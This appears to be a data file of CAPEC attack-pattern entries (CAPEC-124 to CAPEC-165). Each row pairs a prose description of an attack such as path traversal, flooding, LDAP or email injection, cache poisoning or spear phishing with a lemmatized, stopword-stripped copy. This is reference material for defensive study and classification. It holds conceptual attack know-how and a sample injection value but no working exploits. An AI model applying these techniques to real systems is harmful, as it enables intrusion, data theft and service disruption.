CAPEC-124,Shared Resource Manipulation,"An adversary exploits a resource shared between multiple applications, an application pool or hardware pin multiplexing to affect behavior. Resources may be shared between multiple applications or between multiple threads of a single application. Resource sharing is usually accomplished through mutual access to a single memory location or multiplexed hardware pins. If an adversary can manipulate this shared resource (usually by co-opting one of the applications or threads) the other applications or threads using the shared resource will often continue to trust the validity of the compromised shared resource and use it in their calculations. This can result in invalid trust assumptions, corruption of additional data through the normal operations of the other users of the shared resource, or even cause a crash or compromise of the sharing applications.",adversary exploit resource share multiple application application pool hardware pin multiplexing affect behavior resource share multiple application multiple thread single application resource sharing usually accomplish mutual access single memory location multiplexe hardware pin adversary manipulate share resource usually co opt application thread application thread share resource continue trust validity compromise share resource use calculation result invalid trust assumption corruption additional datum normal operation user share resource cause crash compromise sharing application
CAPEC-125,Flooding,"An adversary consumes the resources of a target by rapidly engaging in a large number of interactions with the target. This type of attack generally exposes a weakness in rate limiting or flow. When successful this attack prevents legitimate users from accessing the service and can cause the target to crash. This attack differs from resource depletion through leaks or allocations in that the latter attacks do not rely on the volume of requests made to the target but instead focus on manipulation of the target's operations. The key factor in a flooding attack is the number of requests the adversary can make in a given period of time. The greater this number, the more likely an attack is to succeed against a given target.",adversary consume resource target rapidly engage large number interaction target type attack generally expose weakness rate limiting flow successful attack prevent legitimate user access service cause target crash attack differ resource depletion leak allocation attack rely volume request target instead focus manipulation target operation key factor flooding attack number request adversary give period time great number likely attack succeed give target
CAPEC-126,Path Traversal,"An adversary uses path manipulation methods to exploit insufficient input validation of a target to obtain access to data that should be not be retrievable by ordinary well-formed requests. A typical variety of this attack involves specifying a path to a desired file together with dot-dot-slash characters, resulting in the file access API or function traversing out of the intended directory structure and into the root file system. By replacing or modifying the expected path information the access function or API retrieves the file desired by the attacker. These attacks either involve the attacker providing a complete path to a targeted file or using control characters (e.g. path separators (/ or \) and/or dots (.)) to reach desired directories or files.",adversary use path manipulation method exploit insufficient input validation target obtain access datum retrievable ordinary form request typical variety attack involve specify path desire file dot dot slash character result file access api function traverse intended directory structure root file system replace modify expected path information access function api retrieve file desire attacker attack involve attacker provide complete path target file control character path separator dot reach desire directory file
CAPEC-127,Directory Indexing,"An adversary crafts a request to a target that results in the target listing/indexing the content of a directory as output. One common method of triggering directory contents as output is to construct a request containing a path that terminates in a directory name rather than a file name since many applications are configured to provide a list of the directory's contents when such a request is received. An adversary can use this to explore the directory tree on a target as well as learn the names of files. This can often end up revealing test files, backup files, temporary files, hidden files, configuration files, user accounts, script contents, as well as naming conventions, all of which can be used by an attacker to mount additional attacks.",adversary craft request target result target list index content directory output common method trigger directory content output construct request contain path terminate directory file application configure provide list directory content request receive adversary use explore directory tree target learn name file end reveal test file backup file temporary file hidden file configuration file user account script content naming convention attacker mount additional attack
CAPEC-128,Integer Attacks,"An attacker takes advantage of the structure of integer variables to cause these variables to assume values that are not expected by an application. For example, adding one to the largest positive integer in a signed integer variable results in a negative number. Negative numbers may be illegal in an application and the application may prevent an attacker from providing them directly, but the application may not consider that adding two positive numbers can create a negative number do to the structure of integer storage formats.",attacker take advantage structure integer variable cause variable assume value expect application example add large positive integer sign integer variable result negative number negative number illegal application application prevent attacker provide directly application consider add positive number create negative number structure integer storage format
CAPEC-129,Pointer Manipulation,"This attack pattern involves an adversary manipulating a pointer within a target application resulting in the application accessing an unintended memory location. This can result in the crashing of the application or, for certain pointer values, access to data that would not normally be possible or the execution of arbitrary code. Since pointers are simply integer variables, Integer Attacks may often be used in Pointer Attacks.",attack pattern involve adversary manipulate pointer target application result application access unintended memory location result crashing application certain pointer value access datum normally possible execution arbitrary code pointer simply integer variable integer attacks pointer attacks
CAPEC-13,Subverting Environment Variable Values,The adversary directly or indirectly modifies environment variables used by or controlling the target software. The adversary's goal is to cause the target software to deviate from its expected operation in a manner that benefits the adversary.,adversary directly indirectly modify environment variable control target software adversary goal cause target software deviate expect operation manner benefit adversary
CAPEC-130,Excessive Allocation,"An adversary causes the target to allocate excessive resources to servicing the attackers' request, thereby reducing the resources available for legitimate services and degrading or denying services. Usually, this attack focuses on memory allocation, but any finite resource on the target could be the attacked, including bandwidth, processing cycles, or other resources. This attack does not attempt to force this allocation through a large number of requests (that would be Resource Depletion through Flooding) but instead uses one or a small number of requests that are carefully formatted to force the target to allocate excessive resources to service this request(s). Often this attack takes advantage of a bug in the target to cause the target to allocate resources vastly beyond what would be needed for a normal request.",adversary cause target allocate excessive resource service attacker request reduce resource available legitimate service degrade deny service usually attack focus memory allocation finite resource target attack include bandwidth processing cycle resource attack attempt force allocation large number request resource depletion flooding instead use small number request carefully format force target allocate excessive resource service attack take advantage bug target cause target allocate resource vastly need normal request
CAPEC-131,Resource Leak Exposure,"An adversary utilizes a resource leak on the target to deplete the quantity of the resource available to service legitimate requests.Resource leaks most often come in the form of memory leaks where memory is allocated but never released after it has served its purpose, however, theoretically, any other resource that can be reserved can be targeted if the target fails to release the reservation when the reserved resource block is no longer needed.In this attack, the adversary determines what activity results in leaked resources and then triggers that activity on the target. Since some leaks may be small, this may require a large number of requests by the adversary. However, this attack differs from a flooding attack in that the rate of requests is generally not significant. This is because the lost resources due to the leak accumulate until the target is reset, usually by restarting it. Thus, a resource-poor adversary who would be unable to flood the target can still utilize this attack.Resource depletion through leak differs from resource depletion through allocation in that, in the former, the adversary may not be able to control the size of each leaked allocation, but instead allows the leak to accumulate until it is large enough to affect the target's performance. When depleting resources through allocation, the allocated resource may eventually be released by the target so the attack relies on making sure that the allocation size itself is prohibitive of normal operations by the target.",adversary utilize resource leak target deplete quantity resource available service legitimate request resource leak come form memory leak memory allocate release serve purpose theoretically resource reserve target target fail release reservation reserve resource block long need attack adversary determine activity result leak resource trigger activity target leak small require large number request adversary attack differ flooding attack rate request generally significant lose resource leak accumulate target reset usually restart resource poor adversary unable flood target utilize attack resource depletion leak differ resource depletion allocation adversary able control size leak allocation instead allow leak accumulate large affect target performance deplete resource allocation allocate resource eventually release target attack rely make sure allocation size prohibitive normal operation target
CAPEC-132,Symlink Attack,"An adversary positions a symbolic link in such a manner that the targeted user or application accesses the link's endpoint, assuming that it is accessing a file with the link's name.The endpoint file may be either output or input. If the file is output, the result is that the endpoint is modified, instead of a file at the intended location. Modifications to the endpoint file may include appending, overwriting, corrupting, changing permissions, or other modifications.In some variants of this attack the adversary may be able to control the change to a file while in other cases they cannot. The former is especially damaging since the adversary may be able to grant themselves increased privileges or insert false information, but the latter can also be damaging as it can expose sensitive information or corrupt or destroy vital system or application files. Alternatively, the endpoint file may serve as input to the targeted application. This can be used to feed malformed input into the target or to cause the target to process different information, possibly allowing the adversary to control the actions of the target or to cause the target to expose information to the adversary. Moreover, the actions taken on the endpoint file are undertaken with the permissions of the targeted user or application, which may exceed the permissions that the adversary would normally have.",adversary position symbolic link manner target user application access link endpoint assume access file link endpoint file output input file output result endpoint modify instead file intended location modification endpoint file include appending overwriting corrupting change permission modification variant attack adversary able control change file case especially damaging adversary able grant increase privilege insert false information damaging expose sensitive information corrupt destroy vital system application file alternatively endpoint file serve input target application feed malformed input target cause target process different information possibly allow adversary control action target cause target expose information adversary action take endpoint file undertake permission target user application exceed permission adversary normally
CAPEC-133,Try All Common Switches,"An attacker attempts to invoke all common switches and options in the target application for the purpose of discovering weaknesses in the target. For example, in some applications, adding a --debug switch causes debugging information to be displayed, which can sometimes reveal sensitive processing or configuration information to an attacker. This attack differs from other forms of API abuse in that the attacker is indiscriminately attempting to invoke options in the hope that one of them will work rather than specifically targeting a known option. Nonetheless, even if the attacker is familiar with the published options of a targeted application this attack method may still be fruitful as it might discover unpublicized functionality.",attacker attempt invoke common switch option target application purpose discover weakness target example application add switch cause debug information display reveal sensitive processing configuration information attacker attack differ form api abuse attacker indiscriminately attempt invoke option hope work specifically target know option nonetheless attacker familiar publish option target application attack method fruitful discover unpublicized functionality
CAPEC-134,Email Injection,"An adversary manipulates the headers and content of an email message by injecting data via the use of delimiter characters native to the protocol.Many applications allow users to send email messages by filling in fields. For example, a web site may have a link to ""share this site with a friend"" where the user provides the recipient's email address and the web application fills out all the other fields, such as the subject and body. In this pattern, an adversary adds header and body information to an email message by injecting additional content in an input field used to construct a header of the mail message. This attack takes advantage of the fact that RFC 822 requires that headers in a mail message be separated by a carriage return. As a result, an adversary can inject new headers or content simply by adding a delimiting carriage return and then supplying the new heading and body information. This attack will not work if the user can only supply the message body since a carriage return in the body is treated as a normal character.",adversary manipulate header content email message inject datum use delimiter character native protocol application allow user send email message fill field example web site link share site friend user provide recipient email address web application fill field subject body pattern adversary add header body information email message inject additional content input field construct header mail message attack take advantage fact rfc require header mail message separate carriage return result adversary inject new header content simply add delimit carriage return supply new heading body information attack work user supply message body carriage return body treat normal character
CAPEC-135,Format String Injection,"An adversary includes formatting characters in a string input field on the target application. Most applications assume that users will provide static text and may respond unpredictably to the presence of formatting character. For example, in certain functions of the C programming languages such as printf, the formatting character %s will print the contents of a memory location expecting this location to identify a string and the formatting character %n prints the number of DWORD written in the memory. An adversary can use this to read or write to memory locations or files, or simply to manipulate the value of the resulting text in unexpected ways. Reading or writing memory may result in program crashes and writing memory could result in the execution of arbitrary code if the adversary can write to the program stack.",adversary include format character string input field target application application assume user provide static text respond unpredictably presence format character example certain function c programming language printf format character s print content memory location expect location identify string format character n print number dword write memory adversary use read write memory location file simply manipulate value result text unexpected way read write memory result program crash write memory result execution arbitrary code adversary write program stack
CAPEC-136,LDAP Injection,"An attacker manipulates or crafts an LDAP query for the purpose of undermining the security of the target. Some applications use user input to create LDAP queries that are processed by an LDAP server. For example, a user might provide their username during authentication and the username might be inserted in an LDAP query during the authentication process. An attacker could use this input to inject additional commands into an LDAP query that could disclose sensitive information. For example, entering a * in the aforementioned query might return information about all users on the system. This attack is very similar to an SQL injection attack in that it manipulates a query to gather additional information or coerce a particular return value.",attacker manipulate craft ldap query purpose undermine security target application use user input create ldap query process ldap server example user provide username authentication username insert ldap query authentication process attacker use input inject additional command ldap query disclose sensitive information example enter aforementioned query return information user system attack similar sql injection attack manipulate query gather additional information coerce particular return value
CAPEC-137,Parameter Injection,"An adversary manipulates the content of request parameters for the purpose of undermining the security of the target. Some parameter encodings use text characters as separators. For example, parameters in a HTTP GET message are encoded as name-value pairs separated by an ampersand (&). If an attacker can supply text strings that are used to fill in these parameters, then they can inject special characters used in the encoding scheme to add or modify parameters. For example, if user input is fed directly into an HTTP GET request and the user provides the value ""myInput&new_param=myValue"", then the input parameter is set to myInput, but a new parameter (new_param) is also added with a value of myValue. This can significantly change the meaning of the query that is processed by the server. Any encoding scheme where parameters are identified and separated by text characters is potentially vulnerable to this attack - the HTTP GET encoding used above is just one example.",adversary manipulate content request parameter purpose undermine security target parameter encoding use text character separator example parameter http message encode value pair separate ampersand attacker supply text string fill parameter inject special character encoding scheme add modify parameter example user input feed directly http request user provide value myvalue input parameter set myinput new parameter add value myvalue significantly change meaning query process server encoding scheme parameter identify separate text character potentially vulnerable attack http encoding example
CAPEC-138,Reflection Injection,"An adversary supplies a value to the target application which is then used by reflection methods to identify a class, method, or field. For example, in the Java programming language the reflection libraries permit an application to inspect, load, and invoke classes and their components by name. If an adversary can control the input into these methods including the name of the class/method/field or the parameters passed to methods, they can cause the targeted application to invoke incorrect methods, read random fields, or even to load and utilize malicious classes that the adversary created. This can lead to the application revealing sensitive information, returning incorrect results, or even having the adversary take control of the targeted application.",adversary supply value target application reflection method identify class method field example java programming language reflection library permit application inspect load invoke class component adversary control input method include class method field parameter pass method cause target application invoke incorrect method read random field load utilize malicious class adversary create lead application reveal sensitive information return incorrect result have adversary control target application
CAPEC-139,Relative Path Traversal,"An attacker exploits a weakness in input validation on the target by supplying a specially constructed path utilizing dot and slash characters for the purpose of obtaining access to arbitrary files or resources. An attacker modifies a known path on the target in order to reach material that is not available through intended channels. These attacks normally involve adding additional path separators (/ or \) and/or dots (.), or encodings thereof, in various combinations in order to reach parent directories or entirely separate trees of the target's directory structure.",attacker exploit weakness input validation target supply specially construct path utilize dot slash character purpose obtain access arbitrary file resource attacker modify know path target order reach material available intended channel attack normally involve add additional path separator dot encoding thereof combination order reach parent directory entirely separate tree target directory structure
CAPEC-14,Client-side Injection-induced Buffer Overflow,"This type of attack exploits a buffer overflow vulnerability in targeted client software through injection of malicious content from a custom-built hostile service. This hostile service is created to deliver the correct content to the client software. For example, if the client-side application is a browser, the service will host a webpage that the browser loads.",type attack exploit buffer overflow vulnerability target client software injection malicious content custom build hostile service hostile service create deliver correct content client software example client application browser service host webpage browser load
CAPEC-140,Bypassing of Intermediate Forms in Multiple-Form Sets,"Some web applications require users to submit information through an ordered sequence of web forms. This is often done if there is a very large amount of information being collected or if information on earlier forms is used to pre-populate fields or determine which additional information the application needs to collect. An attacker who knows the names of the various forms in the sequence may be able to explicitly type in the name of a later form and navigate to it without first going through the previous forms. This can result in incomplete collection of information, incorrect assumptions about the information submitted by the attacker, or other problems that can impair the functioning of the application.",web application require user submit information ordered sequence web form large information collect information early form pre populate field determine additional information application need collect attacker know name form sequence able explicitly type later form navigate go previous form result incomplete collection information incorrect assumption information submit attacker problem impair functioning application
CAPEC-141,Cache Poisoning,"An attacker exploits the functionality of cache technologies to cause specific data to be cached that aids the attackers' objectives. This describes any attack whereby an attacker places incorrect or harmful material in cache. The targeted cache can be an application's cache (e.g. a web browser cache) or a public cache (e.g. a DNS or ARP cache). Until the cache is refreshed, most applications or clients will treat the corrupted cache value as valid. This can lead to a wide range of exploits including redirecting web browsers towards sites that install malware and repeatedly incorrect calculations based on the incorrect value.",attacker exploit functionality cache technology cause specific datum cache aid attacker objective describe attack attacker place incorrect harmful material cache target cache application cache web browser cache public cache dns arp cache cache refresh application client treat corrupt cache value valid lead wide range exploit include redirect web browser site install malware repeatedly incorrect calculation base incorrect value
CAPEC-142,DNS Cache Poisoning,A domain name server translates a domain name (such as www.example.com) into an IP address that Internet hosts use to contact Internet resources. An adversary modifies a public DNS cache to cause certain names to resolve to incorrect addresses that the adversary specifies. The result is that client applications that rely upon the targeted cache for domain name resolution will be directed not to the actual address of the specified domain name but to some other address. Adversaries can use this to herd clients to sites that install malware on the victim's computer or to masquerade as part of a Pharming attack.,domain server translate domain ip address internet host use contact internet resource adversary modify public dns cache cause certain name resolve incorrect address adversary specify result client application rely target cache domain resolution direct actual address specify domain address adversary use herd client site install malware victim computer masquerade pharming attack
CAPEC-143,Detect Unpublicized Web Pages,"An adversary searches a targeted web site for web pages that have not been publicized. In doing this, the adversary may be able to gain access to information that the targeted site did not intend to make public.",adversary search target web site web page publicize adversary able gain access information target site intend public
CAPEC-144,Detect Unpublicized Web Services,An adversary searches a targeted web site for web services that have not been publicized. This attack can be especially dangerous since unpublished but available services may not have adequate security controls placed upon them given that an administrator may believe they are unreachable.,adversary search target web site web service publicize attack especially dangerous unpublished available service adequate security control place give administrator believe unreachable
CAPEC-145,Checksum Spoofing,"An adversary spoofs a checksum message for the purpose of making a payload appear to have a valid corresponding checksum. Checksums are used to verify message integrity. They consist of some value based on the value of the message they are protecting. Hash codes are a common checksum mechanism. Both the sender and recipient are able to compute the checksum based on the contents of the message. If the message contents change between the sender and recipient, the sender and recipient will compute different checksum values. Since the sender's checksum value is transmitted with the message, the recipient would know that a modification occurred. In checksum spoofing an adversary modifies the message body and then modifies the corresponding checksum so that the recipient's checksum calculation will match the checksum (created by the adversary) in the message. This would prevent the recipient from realizing that a change occurred.",adversary spoof checksum message purpose make payload appear valid corresponding checksum checksum verify message integrity consist value base value message protect hash code common checksum mechanism sender recipient able compute checksum base content message message content change sender recipient sender recipient compute different checksum value sender checksum value transmit message recipient know modification occur checksum spoofing adversary modify message body modify corresponding checksum recipient checksum calculation match checksum create adversary message prevent recipient realize change occur
CAPEC-146,XML Schema Poisoning,An adversary corrupts or modifies the content of XML schema information passed between a client and server for the purpose of undermining the security of the target. XML Schemas provide the structure and content definitions for XML documents. Schema poisoning is the ability to manipulate a schema either by replacing or modifying it to compromise the programs that process documents that use this schema.,adversary corrupt modify content xml schema information pass client server purpose undermine security target xml schema provide structure content definition xml document schema poisoning ability manipulate schema replace modify compromise program process document use schema
CAPEC-147,XML Ping of the Death,"An attacker initiates a resource depletion attack where a large number of small XML messages are delivered at a sufficiently rapid rate to cause a denial of service or crash of the target. Transactions such as repetitive SOAP transactions can deplete resources faster than a simple flooding attack because of the additional resources used by the SOAP protocol and the resources necessary to process SOAP messages. The transactions used are immaterial as long as they cause resource utilization on the target. In other words, this is a normal flooding attack augmented by using messages that will require extra processing on the target.",attacker initiate resource depletion attack large number small xml message deliver sufficiently rapid rate cause denial service crash target transaction repetitive soap transaction deplete resource fast simple flooding attack additional resource soap protocol resource necessary process soap message transaction immaterial long cause resource utilization target word normal flooding attack augment message require extra processing target
CAPEC-148,Content Spoofing,"An adversary modifies content to make it contain something other than what the original content producer intended while keeping the apparent source of the content unchanged. The term content spoofing is most often used to describe modification of web pages hosted by a target to display the adversary's content instead of the owner's content. However, any content can be spoofed, including the content of email messages, file transfers, or the content of other network communication protocols. Content can be modified at the source (e.g. modifying the source file for a web page) or in transit (e.g. intercepting and modifying a message between the sender and recipient). Usually, the adversary will attempt to hide the fact that the content has been modified, but in some cases, such as with web site defacement, this is not necessary. Content Spoofing can lead to malware exposure, financial fraud (if the content governs financial transactions), privacy violations, and other unwanted outcomes.",adversary modify content contain original content producer intend keep apparent source content unchanged term content spoofing describe modification web page host target display adversary content instead owner content content spoof include content email message file transfer content network communication protocol content modify source modify source file web page transit intercept modify message sender recipient usually adversary attempt hide fact content modify case web site defacement necessary content spoofing lead malware exposure financial fraud content govern financial transaction privacy violation unwanted outcome
CAPEC-149,Explore for Predictable Temporary File Names,"An attacker explores a target to identify the names and locations of predictable temporary files for the purpose of launching further attacks against the target. This involves analyzing naming conventions and storage locations of the temporary files created by a target application. If an attacker can predict the names of temporary files they can use this information to mount other attacks, such as information gathering and symlink attacks.",attacker explore target identify name location predictable temporary file purpose launch attack target involve analyze naming convention storage location temporary file create target application attacker predict name temporary file use information mount attack information gathering symlink attack
CAPEC-15,Command Delimiters,"An attack of this type exploits a programs' vulnerabilities that allows an attacker's commands to be concatenated onto a legitimate command with the intent of targeting other resources such as the file system or database. The system that uses a filter or denylist input validation, as opposed to allowlist validation is vulnerable to an attacker who predicts delimiters (or combinations of delimiters) not present in the filter or denylist. As with other injection attacks, the attacker uses the command delimiter payload as an entry point to tunnel through the application and activate additional attacks through SQL queries, shell commands, network scanning, and so on.",attack type exploit program vulnerability allow attacker command concatenate legitimate command intent target resource file system database system use filter denylist input validation oppose allowlist validation vulnerable attacker predict delimiter combination delimiter present filter denylist injection attack attacker use command delimiter payload entry point tunnel application activate additional attack sql query shell command network scanning
CAPEC-150,Collect Data from Common Resource Locations,"An adversary exploits well-known locations for resources for the purposes of undermining the security of the target. In many, if not most systems, files and resources are organized in a default tree structure. This can be useful for adversaries because they often know where to look for resources or files that are necessary for attacks. Even when the precise location of a targeted resource may not be known, naming conventions may indicate a small area of the target machine's file tree where the resources are typically located. For example, configuration files are normally stored in the /etc director on Unix systems. Adversaries can take advantage of this to commit other types of attacks.",adversary exploit know location resource purpose undermine security target system file resource organize default tree structure useful adversary know look resource file necessary attack precise location target resource know naming convention indicate small area target machine file tree resource typically locate example configuration file normally store director unix system adversary advantage commit type attack
CAPEC-151,Identity Spoofing,"Identity Spoofing refers to the action of assuming (i.e., taking on) the identity of some other entity (human or non-human) and then using that identity to accomplish a goal. An adversary may craft messages that appear to come from a different principle or use stolen / spoofed authentication credentials.Alternatively, an adversary may intercept a message from a legitimate sender and attempt to make it look like the message comes from them without changing its content. The latter form of this attack can be used to hijack credentials from legitimate users. Identity Spoofing attacks need not be limited to transmitted messages - any resource that is associated with an identity (for example, a file with a signature) can be the target of an attack where the adversary attempts to change the apparent identity. This attack differs from Content Spoofing attacks where the adversary does not wish to change the apparent identity of the message but instead wishes to change what the message says. In an Identity Spoofing attack, the adversary is attempting to change the identity of the content.",identity spoofing refer action assume take identity entity human non human identity accomplish goal adversary craft message appear come different principle use steal spoof authentication credential alternatively adversary intercept message legitimate sender attempt look like message come change content form attack hijack credential legitimate user identity spoofing attack need limit transmit message resource associate identity example file signature target attack adversary attempt change apparent identity attack differ content spoofing attack adversary wish change apparent identity message instead wish change message say identity spoofing attack adversary attempt change identity content
CAPEC-153,Input Data Manipulation,"An attacker exploits a weakness in input validation by controlling the format, structure, and composition of data to an input-processing interface. By supplying input of a non-standard or unexpected form an attacker can adversely impact the security of the target.For example, using a different character encoding might cause dangerous text to be treated as safe text. Alternatively, the attacker may use certain flags, such as file extensions, to make a target application believe that provided data should be handled using a certain interpreter when the data is not actually of the appropriate type. This can lead to bypassing protection mechanisms, forcing the target to use specific components for input processing, or otherwise causing the user's data to be handled differently than might otherwise be expected. This attack differs from Variable Manipulation in that Variable Manipulation attempts to subvert the target's processing through the value of the input while Input Data Manipulation seeks to control how the input is processed.",attacker exploit weakness input validation control format structure composition datum input process interface supply input non standard unexpected form attacker adversely impact security target example different character encoding cause dangerous text treat safe text alternatively attacker use certain flag file extension target application believe provide datum handle certain interpreter data actually appropriate type lead bypass protection mechanism force target use specific component input processing cause user datum handle differently expect attack differ variable manipulation variable manipulation attempt subvert target processing value input input data manipulation seek control input process
CAPEC-154,Resource Location Spoofing,"An adversary deceives an application or user and convinces them to request a resource from an unintended location. By spoofing the location, the adversary can cause an alternate resource to be used, often one that the adversary controls and can be used to help them achieve their malicious goals.",adversary deceive application user convince request resource unintended location spoof location adversary cause alternate resource adversary control help achieve malicious goal
CAPEC-155,Screen Temporary Files for Sensitive Information,"An adversary exploits the temporary, insecure storage of information by monitoring the content of files used to store temp data during an application's routine execution flow. Many applications use temporary files to accelerate processing or to provide records of state across multiple executions of the application. Sometimes, however, these temporary files may end up storing sensitive information. By screening an application's temporary files, an adversary might be able to discover such sensitive information. For example, web browsers often cache content to accelerate subsequent lookups. If the content contains sensitive information then the adversary could recover this from the web cache.",adversary exploit temporary insecure storage information monitor content file store temp datum application routine execution flow application use temporary file accelerate processing provide record state multiple execution application temporary file end store sensitive information screen application temporary file adversary able discover sensitive information example web browser cache content accelerate subsequent lookup content contain sensitive information adversary recover web cache
CAPEC-157,Sniffing Attacks,"In this attack pattern, the adversary intercepts information transmitted between two third parties. The adversary must be able to observe, read, and/or hear the communication traffic, but not necessarily block the communication or change its content. Any transmission medium can theoretically be sniffed if the adversary can examine the contents between the sender and recipient. Sniffing Attacks are similar to Adversary-In-The-Middle attacks (CAPEC-94), but are entirely passive. AiTM attacks are predominantly active and often alter the content of the communications themselves.",attack pattern adversary intercept information transmit party adversary able observe read hear communication traffic necessarily block communication change content transmission medium theoretically sniff adversary examine content sender recipient sniffing attack similar adversary middle attack entirely passive aitm attack predominantly active alter content communication
CAPEC-158,Sniffing Network Traffic,"In this attack pattern, the adversary monitors network traffic between nodes of a public or multicast network in an attempt to capture sensitive information at the protocol level. Network sniffing applications can reveal TCP/IP, DNS, Ethernet, and other low-level network communication information. The adversary takes a passive role in this attack pattern and simply observes and analyzes the traffic. The adversary may precipitate or indirectly influence the content of the observed transaction, but is never the intended recipient of the target information.",attack pattern adversary monitor network traffic node public multicast network attempt capture sensitive information protocol level network sniffing application reveal tcp ip dns ethernet low level network communication information adversary take passive role attack pattern simply observe analyze traffic adversary precipitate indirectly influence content observed transaction intend recipient target information
CAPEC-159,Redirect Access to Libraries,"An adversary exploits a weakness in the way an application searches for external libraries to manipulate the execution flow to point to an adversary supplied library or code base. This pattern of attack allows the adversary to compromise the application or server via the execution of unauthorized code. An application typically makes calls to functions that are a part of libraries external to the application. These libraries may be part of the operating system or they may be third party libraries. If an adversary can redirect an application's attempts to access these libraries to other libraries that the adversary supplies, the adversary will be able to force the targeted application to execute arbitrary code. This is especially dangerous if the targeted application has enhanced privileges. Access can be redirected through a number of techniques, including the use of symbolic links, search path modification, and relative path manipulation.",adversary exploit weakness way application search external library manipulate execution flow point adversary supply library code base pattern attack allow adversary compromise application server execution unauthorized code application typically make call function library external application library operate system party library adversary redirect application attempt access library library adversary supply adversary able force target application execute arbitrary code especially dangerous target application enhanced privilege access redirect number technique include use symbolic link search path modification relative path manipulation
CAPEC-16,Dictionary-based Password Attack,"An attacker tries each of the words in a dictionary as passwords to gain access to the system via some user's account. If the password chosen by the user was a word within the dictionary, this attack will be successful (in the absence of other mitigations). This is a specific instance of the password brute forcing attack pattern.Dictionary Attacks differ from similar attacks such as Password Spraying (CAPEC-565) and Credential Stuffing (CAPEC-600), since they leverage unknown username/password combinations and don't care about inducing account lockouts.",attacker try word dictionary password gain access system user account password choose user word dictionary attack successful absence mitigation specific instance password brute forcing attack pattern dictionary attack differ similar attack password spraying credential stuffing leverage unknown username password combination care induce account lockout
CAPEC-160,Exploit Script-Based APIs,"Some APIs support scripting instructions as arguments. Methods that take scripted instructions (or references to scripted instructions) can be very flexible and powerful. However, if an attacker can specify the script that serves as input to these methods they can gain access to a great deal of functionality. For example, HTML pages support <script> tags that allow scripting languages to be embedded in the page and then interpreted by the receiving web browser. If the content provider is malicious, these scripts can compromise the client application. Some applications may even execute the scripts under their own identity (rather than the identity of the user providing the script) which can allow attackers to perform activities that would otherwise be denied to them.",api support scripting instruction argument method script instruction reference script instruction flexible powerful attacker specify script serve input method gain access great deal functionality example html page support script tag allow scripting language embed page interpret receive web browser content provider malicious script compromise client application application execute script identity identity user provide script allow attacker perform activity deny
CAPEC-161,Infrastructure Manipulation,"An attacker exploits characteristics of the infrastructure of a network entity in order to perpetrate attacks or information gathering on network objects or effect a change in the ordinary information flow between network objects. Most often, this involves manipulation of the routing of network messages so, instead of arriving at their proper destination, they are directed towards an entity of the attackers' choosing, usually a server controlled by the attacker. The victim is often unaware that their messages are not being processed correctly. For example, a targeted client may believe they are connecting to their own bank but, in fact, be connecting to a Pharming site controlled by the attacker which then collects the user's login information in order to hijack the actual bank account.",attacker exploit characteristic infrastructure network entity order perpetrate attack information gathering network object effect change ordinary information flow network object involve manipulation routing network message instead arrive proper destination direct entity attacker choose usually server control attacker victim unaware message process correctly example target client believe connect bank fact connect pharming site control attacker collect user login information order hijack actual bank account
CAPEC-162,Manipulating Hidden Fields,"An adversary exploits a weakness in the server's trust of client-side processing by modifying data on the client-side, such as price information, and then submitting this data to the server, which processes the modified data. For example, eShoplifting is a data manipulation attack against an on-line merchant during a purchasing transaction. The manipulation of price, discount or quantity fields in the transaction message allows the adversary to acquire items at a lower cost than the merchant intended. The adversary performs a normal purchasing transaction but edits hidden fields within the HTML form response that store price or other information to give themselves a better deal. The merchant then uses the modified pricing information in calculating the cost of the selected items.",adversary exploit weakness server trust client processing modify datum client price information submit datum server process modify datum example eshoplifting data manipulation attack line merchant purchasing transaction manipulation price discount quantity field transaction message allow adversary acquire item low cost merchant intend adversary perform normal purchasing transaction edit hide field html form response store price information well deal merchant use modify pricing information calculate cost select item
CAPEC-163,Spear Phishing,"An adversary targets a specific user or group with a Phishing (CAPEC-98) attack tailored to a category of users in order to have maximum relevance and deceptive capability. Spear Phishing is an enhanced version of the Phishing attack targeted to a specific user or group. The quality of the targeted email is usually enhanced by appearing to come from a known or trusted entity. If the email account of some trusted entity has been compromised the message may be digitally signed. The message will contain information specific to the targeted users that will enhance the probability that they will follow the URL to the compromised site. For example, the message may indicate knowledge of the targets employment, residence, interests, or other information that suggests familiarity. As soon as the user follows the instructions in the message, the attack proceeds as a standard Phishing attack.",adversary target specific user group phishing attack tailor category user order maximum relevance deceptive capability spear phishing enhance version phishing attack target specific user group quality target email usually enhance appear come know trust entity email account trust entity compromise message digitally sign message contain information specific target user enhance probability follow url compromise site example message indicate knowledge target employment residence interest information suggest familiarity soon user follow instruction message attack proceed standard phishing attack
CAPEC-164,Mobile Phishing,"An adversary targets mobile phone users with a phishing attack for the purpose of soliciting account passwords or sensitive information from the user. Mobile Phishing is a variation of the Phishing social engineering technique where the attack is initiated via a text or SMS message, rather than email. The user is enticed to provide information or visit a compromised web site via this message. Apart from the manner in which the attack is initiated, the attack proceeds as a standard Phishing attack.",adversary target mobile phone user phishing attack purpose solicit account password sensitive information user mobile phishing variation phishing social engineering technique attack initiate text sms message email user entice provide information visit compromise web site message apart manner attack initiate attack proceed standard phishing attack
CAPEC-165,File Manipulation,"An attacker modifies file contents or attributes (such as extensions or names) of files in a manner to cause incorrect processing by an application. Attackers use this class of attacks to cause applications to enter unstable states, overwrite or expose sensitive information, and even execute arbitrary code with the application's privileges. This class of attacks differs from attacks on configuration information (even if file-based) in that file manipulation causes the file processing to result in non-standard behaviors, such as buffer overflows or use of the incorrect interpreter. Configuration attacks rely on the application interpreting files correctly in order to insert harmful configuration information. Likewise, resource location attacks rely on controlling an application's ability to locate files, whereas File Manipulation attacks do not require the application to look in a non-default location, although the two classes of attacks are often combined.",attacker modify file content attribute extension name file manner cause incorrect processing application attacker use class attack cause application enter unstable state overwrite expose sensitive information execute arbitrary code application privilege class attack differ attack configuration information file base file manipulation cause file processing result non standard behavior buffer overflow use incorrect interpreter configuration attack rely application interpret file correctly order insert harmful configuration information likewise resource location attack rely control application ability locate file file manipulation attack require application look non default location class attack combine
